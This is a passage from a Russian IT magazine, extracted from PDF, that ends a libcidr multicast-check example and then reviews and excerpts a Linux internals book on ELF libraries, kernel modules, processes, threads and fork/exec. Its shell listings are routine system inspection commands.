       if( cidr_contains(multicast_net, ip) == 0 ) {
           printf("The argument is an IPv4 multicast address\n");
       } else {
           printf("The argument is not an IPv4 multicast address\n");
       }
   }



     $ sudo aptitude install libcidr‐dev
     $ gcc ‐o is_multicast ‐lcidr ./is_multicast.c
     $ ./is_multicast 8.8.8.8
     The argument is not an IPv4 multicast address
     $ ./is_multicast 239.1.2.3
     The argument is an IPv4 multicast address



  ЗАКЛЮЧЕНИЕ
   Валидация адре сов и выдача информа тивных сообщений об ошибочных нас‐
   тройках  вроде  бы  нез начитель ная  часть  интерфейса,  но  внимание
    к деталям — признак про фессионализ ма, тем более что готовые библиоте ки
   существенно упрощают эту задачу.
АДМИН

 ПРОЦЕССЫ И ПАМЯТЬ
    LINUX  В
                 ОТРЫВОК ИЗ КНИГИ
        «ВНУТРЕННЕЕ УСТРОЙСТВО LINUX»





                                                                             Издательство «БХВ»





Процес сы операционной системы в большинстве случаев
отождествляются  с выполняющимися  программами,  что
не совсем верно, точнее — совсем неверно. В современных
операционных системах, включая Linux, между программой
и процессом  есть  очевидная  взаимосвязь,  но  далеко
не такая непос редственная, как кажется на первый взгляд.


О книге





Совсем недавно в издательстве БХВ вышло второе издание книги Дмитрия
Кетова «Внутреннее устройство Linux». Я про чел предоставленный издатель‐
ством экземпляр и сделал свои выводы о качестве кни ги, ее плюсах
и целевой аудитории. В придачу мы пуб ликуем отрывок книги, который поз‐
волит тебе составить собственное мнение.
  Несмотря на громкое наз вание, эта книга — не об устройстве Linux.
Из нее ты не узнаешь, как работа ет система управления виртуальной
памятью ядра Linux или файловая система Btrfs. Эта книга — скорее учебник
«GNU/Linux для продол жающих», то есть тех, кто понял, что такое командный
интерпретатор и права доступа, но хотел бы копнуть глубже и понять, почему
этот интерпретатор именно такой, с какой целью появился инструмент sudo
и почему, несмотря на весь хейт, менед жер Systemd стал стандартом.
   Главное достоинство книги — грамотное балансирование между теорией
и практикой. Автор сопровождает текст большим количеством исторических
справок и деталей, которые быва ют нез накомы даже мне, умудренному двад‐
цатилетним опытом линуксоиду. При этом практически каждое высказывание
автора сопровождается примером, поясняющим теорию. Хочешь увидеть,
как работают управляющие пос ледова тельности терминала? Вот тебе лис‐
тинг команд с отметками, где, что и как надо нажать.
   Второй плюс — пол нота информа ции. Несмотря на массу подробностей
о реализации компонентов типичного дистри бутива и сравнительно неболь‐
шой объем, книга охватывает практичес ки все, что может быть интерес но
пользователю, начиная от эму лятора тер минала и командного интерпре тато‐
ра и заканчивая графичес кой системой Wayland, которая только готовится
занять место стандартной в дистрибутивах Linux, планировщиком BFQ и кон‐
тейнерной системой Docker, о которых ты не узнаешь из более «академичес‐
кой» и «проверенной временем» литера туры.
  В целом эта книга для тех, кто стремится стать тем самым гуру Linux,
который не только сможет рас сказать, как удалить «неудаляемый» файл
или исправить терминал после вывода в него бинарного фай ла, но и будет
понимать, почему эти инструкции работа ют. Но это точно книга не для тех, кто
хотел бы разобраться, как работа ют операци онные сис темы на уровне ядра.
 — Евгений Зоб нин



             INFO

                     На сайте издательства можно купить эту книгу
                       со скидкой 20% по промокоду linuxakep. Про‐
                      мокод  следует  ввести  на  этапе оформления
                         заказа, нажав на ссылку «У вас есть купон? Наж‐
                      мите здесь для введения кода».



ПРОГРАММЫ И БИБЛИОТЕКИ
Программа представляет собой алгоритм, записанный на определен ном
языке, понятном исполнителю программы. Раз личают машинный язык, понят‐
ный центральному процессору, и язы ки более высоких уровней (алгорит‐
мические), понятные сос тавителю программы — прог раммисту.
   Программы, составленные на языке высокого уровня, в любом случае
перед исполне нием должны быть транслированы (переве дены) на язык
исполнителя, что реализуется при помощи специаль ных средств — трансля-
торов. Различают два вида трансляторов программ — ком пиляторы и ин-
тер пре таторы. Компилятор транслирует в машин ный код сразу целиком всю
программу и не участву ет в ее исполнении. Интерпретатор, наоборот,
пошагово тран слирует отдельные инс трукции программы и немедленно
выпол няет их. Например, командный интер пре татор при интерактивном
режиме пошагово выпол няет команды, вводимые пользовате лем, а в пакет‐
ном режиме так же пошагово выполняет команды, записанные в файле сце‐
нария.
  Алгоритм, в свою очередь, есть некоторый набор инструкций, выпол‐
нение которых приводит к решению конкретной задачи. В большинс тве слу‐
чаев инструкции алгорит ма имеют при чин но‐следственные зависимости
и выполняются исполнителем пос ледова тельно. Однако если выделить
«независимые» поднаборы инструкций (независимые ветви), то их можно
выпол нять несколькими исполнителя ми одновременно — па раллельно.
Поэтому различают пос ледова тельные и параллельные алгоритмы и соот‐
ветствующие им последовательные и парал лельные программы. Некоторые
программы реализуют алго ритмы общего назначения, например алгоритмы
сжатия или шиф рования информа ции, алгорит мы сетевых протоколов и т. д.
Такие программы, востребованные не столько конечными пользователями,
сколько другими программами, называют библиоте ками.
   Согласно hier, откомпилиро ванные до машин ного языка программы раз‐
мещаются в катало гах /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin,
/usr/local/sbin, а библиотеки — в каталогах /lib, /usr/lib, /usr/local/
lib. Программы имеют специальный бинарный «запус каемый» формат W:
[ELF] executable и зависят от библиотек, что проиллюс трировано в сле‐
дующем листинге при помощи команды ldd (loader dependencies). Каждая
зависимость отображается именем биб лиотеки ❶ (SONAME, shared object
name), найденным в системе файлом биб лиотеки ❷ и адресом в памяти про‐
цесса ❸ (32‐ или 48‐битным, в зависимос ти от платформы), куда библиотека
будет загружена.


Программы и биб лиоте ки


  fitz@ubuntu:~$ which ls
  /usr/bin/ls
  fitz@ubuntu:~$ file /usr/bin/ls
  /usr/bin/ls: ELF 64‐bit LSB pie executable, x86‐64, version 1 (SYSV),
  dynamically linked, interpreter /lib64/ld‐linux‐x86‐64.so.2,
  BuildID[sha1]=2f15ad836be3339dec0e2e6a3c637e08e48aacbd, for GNU/Linux
  3.2.0, stripped
  fitz@ubuntu:~$ ldd /usr/bin/ls
      linux‐vdso.so.1 (0x00007ffcb529d000)
      libselinux.so.1 => /lib/x86_64‐linux‐gnu/libselinux.so.1 (0x00007f‐
  b02f58d000)
    ❶ libc.so.6 => ❷ /lib/x86_64‐linux‐gnu/libc.so.6 (0x00007fb02f39c000)
  ❸
      libpcre2‐8.so.0 => /lib/x86_64‐linux‐gnu/libpcre2‐8.so.0 (0x00007f‐
  b02f317000)
      libdl.so.2 => /lib/x86_64‐linux‐gnu/libdl.so.2 (0x00007fb02f311000)
      /lib64/ld‐linux‐x86‐64.so.2 (0x00007fb02f5f1000)
      libpthread.so.0 => /lib/x86_64‐linux‐gnu/libpthread.so.0
  (0x00007fb02f2ee000)


  fitz@ubuntu:~$ file /lib/x86_64‐linux‐gnu/libc.so.6
  ❹ /lib/x86_64‐linux‐gnu/libc.so.6: symbolic link to libc‐2.30.so


Нужно заметить, что файла библиотеки linux‐vdso.so.1 (реализующей
интерфейс системных вызовов к ядру) не сущес твует, так как она является
виртуальной (VDSO,  virtual dynamic shared object),  т. е. пре дос тавляется
и отображается в память процес са самим ядром, «как будто» явля ется нас‐
тоящей библиотекой. Кроме того, биб лиотека ld‐linux‐x86‐64.so.2 ука‐
зана абсолютным путевым именем, поэтому поиск ее файла не производит‐
ся.
  Для большинства библиотек зависимость уста навливается при помощи
SONAME вида libNAME.so.X, где lib — стандартный префикс (library, биб‐
лиотека), .so — суффикс (shared object, разделяемый объект), NAME — имя
«собственное», а .X — номер версии ее интерфейса. По имени SONAME
в определенных (конфигурацией компоновщика) каталогах производится
поиск одноименного файла библиотеки, который на самом деле оказывается
символической ссылкой ❹  на «настоящий» файл библиотеки. Например,
для 6‐й версии интерфейса динамической биб лиотеки языка с (libc.so.6)
настоящий файл библиотеки называется libc2.30.so, что указывает на вер‐
сию самой библиотеки как 2.30.


Версии биб лиотек


  fitz@ubuntu:~$ file /lib/x86_64‐linux‐gnu/libpcre2‐8.so.0
  /lib/x86_64‐linux‐gnu/libpcre2‐8.so.0: symbolic link to libpcre2‐
  8.so.0.7.1


Аналогично, в приведенном выше листинге показано, что для 0‐й версии
интерфейса динамичес кой библиотеки регулярных perl‐выражений pcre2
(libpcre2‐8.so.0) настоящий файл библиотеки называется libpcre2‐8.so.
0.7.1, а это указывает на версию самой биб лиотеки как 0.7.1.
   Такой подход позволя ет заменять (исправлять ошибки, улучшать неэф‐
фективные алгоритмы и пр.) библиотеки (при условии неизменности их
интерфейсов) отдельно от программ, завися щих от них. При обновлении
библиотеки libc2.30.so, например, до libc2.32.so достаточно установить
символическую SONAME‐ссылку libc.so.6 на libc‐2.32.so, в результате
чего ее начнут исполь зовать все прог раммы с зависимостями от libc.so.6.
Более  того, в системе может быть одновременно  установлено любое
количество версий одной и той же биб лиотеки, реализующих одинаковые
или разные вер сии интерфейсов, выбор которых будет указан соответс тву‐
ющими SONAME‐ссылками.


Биб лиоте ки — это незапускаемые программы


  fitz@ubuntu:~$ file /lib/x86_64‐linux‐gnu/libc‐2.30.so
  /lib/x86_64‐linux‐gnu/libc‐2.30.so: ELF 64‐bit LSB shared object, x86‐
  64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld‐
  linux‐x86‐64.so.2, BuildID[sha1]=2155f455ad56bd871c8225bc‐
  ca85ee25c1c197c4, for GNU/Linux 3.2.0, stripped
  fitz@ubuntu:~$ file /lib/x86_64‐linux‐gnu/libpcre2‐8.so.0.7.1
  /lib/x86_64‐linux‐gnu/libpcre2‐8.so.0.7.1: ELF 64‐bit LSB shared object,
  x86‐64, version 1 (SYSV), dynamically linked, BuildID[sha1]=815e1acbc‐
  c22015f05d62c17fe982c1b573125b1, stripped


  fitz@ubuntu:~$ ldd /lib/x86_64‐linux‐gnu/libpcre2‐8.so.0.7.1
          linux‐vdso.so.1 (0x00007ffe22093000)
          libpthread.so.0 => /lib/x86_64‐linux‐gnu/libpthread.so.0
  (0x00007f8ec2bdd000)
          libc.so.6 => /lib/x86_64‐linux‐gnu/libc.so.6
  (0x00007f8ec29ec000)
          /lib64/ld‐linux‐x86‐64.so.2 (0x00007f8ec2c99000)


Библиотеки имеют тот же бинарный формат W:[ELF], что и «запускаемые»
программы, но не «запус каемый» executable, а «совместно используемый»
shared object. Библиотеки, являясь пусть и незапускаемыми, но программа‐
ми, естественным образом тоже зависят от дру гих библиотек, что показано
в следующем листинге. Практически «запус каемость» ELF‐файлов зависит
не от их типа, а от прав доступа и осмыслен ности точки входа — адре са пер‐
вой инструкции, которой передается управление при попытке запус ка. Нап‐
ример, библиоте ку libc‐2.30.so можно запустить, в результате чего будет
выведена статусная информация.


Запускаемые биб лиоте ки


  fitz@ubuntu:~$ ls –l /lib/x86_64‐linux‐gnu/libc‐2.30.so
    ‐rwxr‐xr‐x 1 root root 2025032 сен 16 17:56 /lib/x86_64‐linux‐
  gnu/libc‐2.30.so
  fitz@ubuntu:~$ /lib/i386‐linux‐gnu/libc‐2.15.so
  GNU C Library (Ubuntu GLIBC 2.30‐0ubuntu2) stable release version 2.30.
  Copyright (C) 2019 Free Software Foundation, Inc.
  This is free software; see the source for copying conditions.
  There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
  PARTICULAR PURPOSE.
  Compiled by GNU CC version 9.2.1 20190909.
  libc ABIs: UNIQUE IFUNC ABSOLUTE
  For bug reporting instructions, please see:
  <https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs>.



Ядро Linux
Не стоит забывать, что самой главной программой опе рационной сис темы
является ее ядро, которое в Linux сос тоит из ста тичес кого стартового модуля
в формате ELF executable и динамичес ки пристыковываемых программных
модулей формата ELF relocatable. Для выполнения процедуры начальной заг‐
рузки стартовый модуль упа кован в «саморас паковывающийся» gzip‐архив
формата bzImage (big zipped image), который сос тоит из программы рас‐
паковки и собственно запакованного стартового модуля.
  В приведенном ниже листинге проиллюстрирован процесс извлечения
стартового модуля из архива /boot/vmlinuz‐3.13.0‐49‐generic формата
bzImage ⓿, который предварительно копиру ется ❶  в /tmp/vmlinuz.
Для извлечения используется сценарий extract‐vmlinux ❷  из пакета
заголовочных файлов ядра. Рас пакованный ❸ стартовый модуль /tmp/vmlin‐
ux ожидаемо оказывается статически скомпонованной  (т. е. не исполь‐
зующей библиотеки ELF shared object) исполняемой ELF‐программой.


Яд ро опе рационной системы


  fitz@ubuntu:~$ uname ‐r
  5.3.0‐23‐generic
  fitz@ubuntu:~$ file /boot/vmlinuz‐5.3.0‐23‐generic
  /boot/vmlinuz‐5.3.0‐23‐generic: regular file, no read permission
  fitz@ubuntu:~$ ls ‐l /boot/vmlinuz‐5.3.0‐23‐generic
  ‐rw‐‐‐‐‐‐‐ 1 root root 11399928 ноя 12 11:51 /boot/vmlinuz‐5.3.0‐23‐
  generic
  fitz@ubuntu:~$ sudo file /boot/vmlinuz‐5.3.0‐23‐generic
  ⓿ /boot/vmlinuz‐5.3.0‐23‐generic: Linux kernel x86 boot executable bzIm‐
  age, version 5.3.0‐23‐generic (buildd@lgw01‐amd64‐002) #25‐Ubuntu SMP
  Tue Nov 12 09:22:33 UTC 2019, RO‐rootFS, swap_dev 0xA, Normal VGA
  ❶ fitz@ubuntu:~$ sudo cat /boot/vmlinuz‐5.3.0‐23‐generic > /tmp/vmlinuz
  ❷ fitz@ubuntu:~$ /usr/src/linux‐headers‐5.3.0‐23/scripts/extract‐vmlinux
  /tmp/vmlinuz > /tmp/vmlinux
  fitz@ubuntu:~$ file /tmp/vmlinux
    /tmp/vmlinux: ELF 64‐bit LSB executable ❸, x86‐64, version 1 (SYSV),
  statically linked, BuildID[sha1]=b23ff3f6790319ec538278e3269af619ba2‐
  ca642, stripped


Динамические модули загружаются в прос транство ядра и пристыковы ваются
к стартовому модулю поз днее, уже при работе опе раци онной системы
при помощи системных утилит insmod или modprobe. Для отстыковки и выг‐
рузки ненужных модулей предназначена системная утилита rmmod, для прос‐
мотра списка ❶ загруженных модулей — lsmod, а для идентификации свойств
и параметров ❷ модулей — утилита modinfo. Заг рузка и выгрузка модулей
реализуется специальными системными вызова ми init_module и delete_‐
module, доступ к списку загруженных модулей — при помощи файла /proc/
modules  псевдофайловой  системы  proc,  а  идентификация  свойств
и параметров модулей — чтением специальных секций ELF‐файлов модулей.


Модули ядра


  ❶ fitz@ubuntu:~$ lsmod
  Module                  Size  Used by
  ...
  i915                 1949696  4
  ...
  btusb                  57344  0
  ...
  uvcvideo               98304  0
  ...
  e1000e                 258048 0
  ...
  ❷ fitz@ubuntu:~$ modinfo i915
  filename:       /lib/modules/5.3.0‐23‐
  generic/kernel/drivers/gpu/drm/i915/i915.ko
  license:        GPL and additional rights
  description:    Intel Graphics
  ...
  fitz@ubuntu:~$ file /lib/modules/5.3.0‐23‐
  generic/kernel/drivers/gpu/drm/i915/i915.ko
  /lib/modules/5.3.0‐23‐generic/kernel/drivers/gpu/drm/i915/i915.ko: ELF
  64‐bit LSB relocatable, x86‐64, version 1 (SYSV),
  BuildID[sha1]=49e59590c1a718074b76b6541702f6f794ea7eae, not stripped


Динамические модули ядра зачастую являются драй верами устройств, что
проиллюстрировано в листинге при помощи утилит lspci и lsusb, которые
сканируют посредством псевдофайловой системы sysfs списки обнаружен‐
ных ядром на шинах PCI и USB устройств и обслу жива ющих их драйверов.


Драйверы устройств


  fitz@ubuntu:~$ lspci ‐k
  ...
  00:02.0 VGA compatible controller: Intel Corporation 2nd Generation Core
  Process
  or Family Integrated Graphics Controller (rev 09)
          Subsystem: Dell 2nd Generation Core Processor Family Integrated
  Graphics
   Controller
          Kernel driver in use: i915
          Kernel modules: i915
  ...
  00:19.0 Ethernet controller: Intel Corporation 82579LM Gigabit Network
  Connection (Lewisville) (rev 04)
          Subsystem: Dell 82579LM Gigabit Network Connection (Lewisville)
          Kernel driver in use: e1000e
          Kernel modules: e1000e
  fitz@ubuntu:~$ lsusb –t
  ...
  /:  Bus 01.Port 1: Dev 1, Class=root_hub, Driver=ehci‐pci/3p, 480M
  |__ Port 1: Dev 2, If 0, Class=Hub, Driver=hub/6p, 480M
  |__ Port 4: Dev 3, If 2, Class=Vendor Specific Class, Driver=, 12M
  |__ Port 4: Dev 3, If 0, Class=Wireless, Driver=btusb, 12M
  |__ Port 4: Dev 3, If 3, Class=Application Specific Interface, Driver=,
  12M
  |__ Port 4: Dev 3, If 1, Class=Wireless, Driver=btusb, 12M
  |__ Port 5: Dev 4, If 0, Class=Video, Driver=uvcvideo, 480M
  |__ Port 5: Dev 4, If 1, Class=Video, Driver=uvcvideo, 480M




                                     Продолжение статьи →
АДМИН               ← НАЧАЛО СТАТЬИ

 ПРОЦЕССЫ И ПАМЯТЬ
               LINUX            В
                           ОТРЫВОК ИЗ КНИГИ
                  «ВНУТРЕННЕЕ УСТРОЙСТВО LINUX»





ПРОЦЕССЫ И НИТИ
Сущность процес са  неразрывно  свя зана  с  мультипрограммированием
и многозадачностью операционной системы. Например, в однозадачных опе‐
рационных системах программы существу ют, а про цессы — нет. В одно‐
задачных опе рационных системах единовременно одна пос ледовательная
программа выполняется одним исполнителем (центральным процес сором),
имея возможность без раздельно использовать все доступные ресурсы
(память, устройства ввода‐вывода и пр.).
  В любой программе можно выделить перемежающиеся блоки инструкций,
использующих или центральный процессор  (ЦП), или  устройства  вво‐
да‐вывода (УВВ). При этом центральный процессор вынужден простаивать
при выполнении программой операций вво да‐вывода, например, при ожи‐
дании окончания записи (или чтения) блока данных на внешний носитель,
или при ожидании окончания переда чи (или при ема) сетевого кадра, или при
ожидании событий с устройств человеко‐машинного взаимодей ствия. С дру‐
гой  стороны,  устрой ства  ввода‐вывода  тоже  вынуждены  прос таивать
при выполнении программой вычислительных операций, например, ожидая
результата, подлежащего выводу, или ожидая воз никновения у программы
потребности в новых исходных данных.
  Используя такую модель поведения программ, можно провес ти анализ
потребления ими ресурсов при выпол нении. Например, компрессоры gzip,
bzip и xz считывают очередной блок данных исходного файла, относительно
долго упаковывают его и записывают в резуль тиру ющий файл, а затем пов‐
торяют процедуру до исчерпа ния блоков исходного файла. Количество вре‐
мени, потраченного на вычислительные операции упаковки, будет много
больше количества времени, потраченного на чтение исходных данных
и запись результатов, поэтому наг рузка на ЦП будет высокой, а на УВВ — нет.
Такой же анализ можно привести и для дубликато ра dd, копировщика rsync
или архиватора tar, которые, наобо рот, почти не выполняют никаких вычис‐
лений, а сосредоточены на вво де‐выводе больших объ емов данных, поэтому
при их использовании нагрузка на ЦП будет доволь но низкой, а на УВВ —
высокой.
  Для командного интерпретатора bash, текстовых редакторов nano и vim
и других интерактивных программ, взаимодей ствующих с пользователем,
характерны длительные ожидания вво да неболь ших команд, простая и недол‐
гая их обработка и вывод короткого результата. В результате коэф фици ент
полезного использования и ЦП, и УВВ будет приб лижен к нулю.
  Подобный анализ и желание увеличить коэффициенты полезного исполь‐
зования ресурсов привели к соз данию многоза дач ных операционных сис‐
тем, основывающихся на простой идее псевдоодновре менного выпол нения
нескольких последовательных программ одним исполнителем. Для этого
вместо простоя в ожидании окончания операции ввода‐вывода, начатой
некоторой программой, центральный про цес сор переключается на выпол‐
нение другой программы, тем самым увеличивая интегральный коэф фици ент
его полезного исполь зования.
  С появлением мультипрограммной смеси (так называют набор программ,
между которыми переключается процес сор) каждая из ее программ больше
не может безраздельно использовать все доступные ресурсы (например, всю
память — она одновремен но нужна всем программам смеси), в связи с чем
операционная система берет на себя задачи дис петчеризации (рас пределе‐
ния) ресурсов между ними. В Linux, как и во многих других операционных сис‐
темах, программы изолируются друг от дру га в специальных «виртуальных»
средах, обеспечивающих их процесс выполнения. Каждая  такая сре да
называется процессом и получа ет долю доступных ресурсов — выделенный
участок памяти, выделенные промежут ки про цес сорного времени. Процесс
эмулирует для программы «однозадачный» режим выполнения, словно прог‐
рамма выполняется в одиночку, и «безраздельное» использование ресурсов
процесса, как будто это все доступные ресурсы.
  Параллельные программы, как ука зывалось ранее, состоят из незави‐
симых ветвей, каждая из которых сама по себе укладывается в модель
поведения последовательной программы, поэтому одну парал лельную прог‐
рамму можно выполнять в нескольких про цес сах в псевдоодновременном
режиме. Процес сы операционной системы, таким образом, явля ются кон‐
тейнерами для многозадачного выполнения программ, как последователь‐
ных, так и параллельных.
  В следующем листинге при помощи команды ps показаны процес сы поль‐
зователя,  упорядоченные  в  дерево,  пос троенное  на  основе  дочер‐
не‐родительских отно шений между процес сами. Уникальный идентификатор,
отличающий про цесс от дру гих, выведен в столбце PID (process identiﬁer),
а имя и аргументы программы, запущенной в соот ветс твующем процессе —
в столбце COMMAND.
  В столбце STAT показа но текущее состояние про цес са, например S (сон,
sleep) или R (выпол нение, running, или готовность к выполнению, runnable).
Процессы, ожидающие завершения их операций ввода‐вывода, находятся
в состоянии сна, в противном случае либо выпол няются, либо готовы
к выпол нению, т. е. ожидают, когда текущий выполняющийся процесс зас нет
и процессор будет переключен на них. В столбце TIME показано чис тое пот‐
ребленное процессом процессорное время от момента запус ка программы,
увеличивающееся толь ко при нахож дении им в состоянии выполнения.


Де рево про цессов пользовате ля


  fitz@ubuntu:~$ ps fx
    PID TTY      STAT   TIME COMMAND
  ...
  17764 tty3     Ssl+   0:00 /usr/lib/gdm3/gdm‐x‐session ‐‐run‐script ...
  17766 tty3     Sl+    3:09    _ /usr/lib/xorg/Xorg vt3 ‐displayfd 3 ...
  17774 tty3     Sl+    0:00    _ /usr/lib/gnome‐session/gnome‐session‐bi‐
  nary ...
  ...
   2987 ?        Ss     0:04 /lib/systemd/systemd ‐‐user
   2992 ?        S      0:00    _ (sd‐pam)
  17373 ?        Ssl    0:08    _ /usr/bin/pulseaudio ‐‐daemonize=no
  17444 ?        Ss     0:02    _ /usr/bin/dbus‐daemon ‐‐session ‐‐ad‐
  dress=systemd: ...
  ...
  17921 ?        Ssl   10:04    _ /usr/bin/gnome‐shell
  ...
  ⓿ 30192 ?      Ssl    0:00    _ /usr/libexec/gnome‐terminal‐server
  ❶ 30202 pts/1  Ss     0:00    _ bash
  ❷ 30226 pts/1  S+     0:00       _ man ps
    30236 pts/1  S+     0:00          _ pager
  ❶ 30245 pts/3  Ss     0:00    _ bash
  ❷ 30251 pts/3  R+     0:00       _ ps fx
  ❸ 30315 ?      Sl     0:04    _ /usr/lib/firefox/firefox ‐new‐window
  30352 ?        Sl     0:02       _ /usr/lib/firefox/firefox ‐contentproc
  ‐childID 1 ...
  30396 ?        Sl     0:00       _ /usr/lib/firefox/firefox ‐contentproc
  ‐childID 2 ...
  30442 ?        Sl     0:00       _ /usr/lib/firefox/firefox ‐contentproc
  ‐childID 3 ...


Управляющий терминал про цес са, показанный в столбце TTY, используется
для доставки ему интерактивных сиг налов (см. разд. 4.8) при вводе управля‐
ющих символов intr ^C, quit ^\ и пр. у части процессов ⓿, ❸ управля‐
ющий терминал отсутству ет, потому что они выполняют приложе ния, взаимо‐
действующие с поль зователем не пос редством терминалов, а через гра‐
фическую систему.
  Процесс по своему определению изолирует свою программу от других
выпол няющихся  программ,  что  зат рудняет  использование  процессов
для выполнения таких параллельных программ, ветви которых не являются
полностью независимыми друг от друга и должны обмениваться данными.
Использование предназна ченных для этого средств межпроцес сного вза‐
имодействия при интенсивном обмене при водит  к обре менению неоп‐
равданными накладными расходами, поэтому для эффективного выполнения
таких параллельных программ исполь зуются легковесные процессы (LWP,
light‐weight processes), они же нити (threads).


             INFO

                     Существует еще один (неудачный, на мой взгляд)
                      перевод понятия thread на русский язык — поток.
                      Во‐первых, он кон флик тует с переводом понятия
                        stream — поток, а во‐вторых, в отличие от stream,
                          thread никуда не течет. А вот процесс (process)
                      содержит в себе нити (thread) абсолютно таким
                    же образом,  как и обычная верев ка состоит
                       из нитей.


Механизм нитей позволяет переключать центральный процес сор между
парал лельными ветвями одной программы, раз мещаемыми в од ном (!) про‐
цессе. Нити никак не изолиро ваны друг от дру га, и им доступны абсолютно
все ресурсы своего процес са, поэто му задача обмена данными между
нитями попросту отсутствует, т. к. все данные являются для них общими.
  В примере из cktle.otuj следующего листинга показаны нити процес са
в BSD‐формате вывода. Выбор процес са производится по его идентифика‐
тору PID, предварительно полученному командой pgrep по имени прог‐
раммы, выполняющейся в искомом про цес се.
  В выводе наличие нитей процес са отмечает флаг l (lwp) в столбце сос‐
тояния STAT, а каждая строчка без идентифика тора PID символизирует одну
нить. Так как в многонитевой прог рамме переключение процессора произво‐
дится между нитями, то и состояния сна S, выполнения или ожидания R при‐
писываются отдельным нитям.


Ни ти про цессов, BSD-формат вывода


  fitz@ubuntu:~$ pgrep firefox
  30315
  fitz@ubuntu:~$ ps mp 30315
    PID TTY      STAT   TIME COMMAND
    PID TTY      STAT   TIME COMMAND
  30315 ?        ‐      0:05 /usr/lib/firefox/firefox ‐new‐window
      ‐ ‐       Sl     0:03 ‐
  ...
      ‐ ‐        Sl     0:00 ‐
      ‐ ‐        Sl     0:00 ‐
      ‐ ‐        Sl     0:00 –


В нижеследующем лис тинге показаны нити процесса в SYSV‐формате
вывода. Выбор процесса производится по имени его программы. Общий
для всех нитей идентифика тор их процесса отоб ражается в столбце PID, уни‐
кальный идентификатор каждой нити — в стол бце LWP (иногда называемый
TID, thread  identiﬁer), а имя процес са (или собственное имя нити, если
задано) — в стол бце CMD.


Ни ти про цессов, SYSV-формат вывода


  fitz@ubuntu:~$ ps ‐LC firefox
    PID  LWP TTY          TIME CMD
  30315 30315 ?        00:00:04 firefox
  30315 30320 ?        00:00:00 gmain
  30315 30321 ?        00:00:00 gdbus
  ...
  30315 30328 ?        00:00:00 Socket Thread
  30315 30332 ?        00:00:00 Cache2 I/O
  30315 30333 ?        00:00:00 Cookie
  ...
  30315 30371 ?        00:00:00 HTML5 Parser
  30315 30373 ?        00:00:00 DNS Resolver #3
  ...



Порождение процессов и нитей, запуск программ
Несмотря на очевидные раз личия, историю возникновения и развития, нити
и процессы объединяет общее назначение — они явля ются примитивами
выпол нения некоторого набора последователь ных инструкций. Откровенно
говоря, нити, в общем, появились в операционных сис темах раньше, чем изо‐
лированные UNIX‐процес сы, в которые со временем вернулись UNIX‐нити.
  Процессы выпол няют или раз ные последователь ные программы целиком,
или ветви одной параллель ной программы, но в изолированном окру жении
со своим «частным» (private) набором ресурсов. Нити, наоборот, выполняют
ветви одной параллельной прог раммы в одном окру жении с «общим» (shared)
набором ресурсов. В многоза дачном ядре Linux вообще используется уни‐
версальное понятие «задача», которая может иметь как общие ресурсы
(память, открытые файлы и т. д.) с дру гими задача ми, так и частные ресурсы
для своего собственного использования.
  Порождение нового процесса реализуется при помощи системного
вызова fork, в результате которо го ядро операционной системы соз дает
                                      2новый дочерний  (child) процесс PID — полную копию (COPY) процес‐
                                 1.са‐родите ля (parent) PID  Вся (за небольшими исключениями) память про‐
цесса — состояние, свойства, атрибуты (кроме идентификатора PID) и даже
содержимое (программа с ее библиотеками) — нас ледуется дочерним про‐
цессом. Даже выпол нение порожденно го и порождающего процесса продол‐
жится с одной и той же инс трукции их одинаковой программы. Такое клониро‐
вание обычно используют параллельные программы с ветвями, выполняющи‐
мися в дочерних процессах.
   Уничтожение процес са (нап ример, при штатном окончании программы)
производится с помощью системно го вызова exit. При этом родительскому
процессу доставляется  сигнал SIGCHILD, оповещающий о завершении
дочернего процесса. Статус завершения status, переданный дочерним про‐
цессом через аргументы exit, будет сох ранять ся ядром до момента его вос‐
требования родительским про цес сом при помощи системного вызова wait,
а весь этот промежуток времени дочерний процесс будет находиться в сос‐
тоянии Z (zombie).
  Родительский процесс может завершиться рань ше своих дочерних про‐
цессов, тогда логично предположить, что все «осиротевшие» процессы ока‐
жутся зомби по завершении, потому как просто некому будет востребовать их
статус завершения. На самом деле этого не происходит, потому что «оси‐
ротевшим» процессам наз нача ется приемный родитель, в качестве которого
выступает прародитель всех процессов init с идентификатором PID = 1.





          Порождение про цес сов (а) и запуск программ (б)

Запуск новой программы (см. рис.) реализуется при помощи сис темного
                                                               1вызова exec, в результате которого содержимое процес са PID  пол ностью
замещается запускаемой программой и библиотеками, от которых она
зависит, а свойства и атрибуты (включая идентифика тор PID) остаются неиз‐
менными. Такое замещение обычно используется программами, устанав‐
ливающими нужные зна чения свойств и атрибутов процес са и подготавлива‐
ющими ресурсы процесса к выполнению запускаемой программы. Например,
обработчик терминального доступа getty открывает заданный терминал,
устанавливает режимы работы порта терминала, перенаправляет на тер‐
минал стандартные потоки ввода‐вывода, а затем замещает себя прог‐
раммой аутентификации login.
  Для запуска новой программы в новом процес се используются оба сис‐
темных
вызова fork и exec согласно принципу fork‐and‐exec «раздвоиться и запус‐
тить», показанного на рисунке ниже. Нап ример, командный интерпретатор
bash по командам ps  fx или man  ps порождает дочерние процессы ❷
и замещает их программа ми ps и man. Тем же образом дей ствует ⓿ гра‐
фический эмулятор терминала gnome‐terminal‐server — запус кая новый сеанс
пользователя ❶ на каждой из своих вкладок, он замещает свои дочерние
процессы программой интерпретатора bash.





              Запуск программы в отдельном процессе

Следующий листинг иллюстрирует команду интерпретатора, запущенную
в «фоновом» режиме при помощи конструкции асинхронного списка. Ана‐
логично всем предыду щим командам, интерпретатор использует fork‐and‐
exec для запуска программы в дочернем про цес се с идентификатором
23228, но не дожидается его завершения при помощи системного вызова
wait, как обычно, а немедленно ❶ продолжает интерактивное взаимодей‐
ствие с пользователем, сообщив ему PID порожденного процес са и «номер
задания» [1] команды «заднего фона». Оповещение о завершении своего
дочернего процесса интерпретатор получит позже, при помощи сигнала
SIGCHLD, и отреагирует соот ветс твующим сообщением ❷  об окончании
команды «заднего фона».


Фо новое выпол нение программ


  fitz@ubuntu:~$ dd if=/dev/dvd of=plan9.iso &


  ❶ [1] 23228
  fitz@ubuntu:~$ ps f
    PID TTY      STAT   TIME COMMAND
  23025 pts/1    S      0:00 ‐bash
  23228 pts/1   R      1:23    _ dd if=/dev/dvd of=plan9.iso
  23230 pts/1    R+     0:00    _ ps f
  fitz@ubuntu:~$
  ...
  fitz@ubuntu:~$ 586896+0 записей получено
  586896+0 записей отправлено
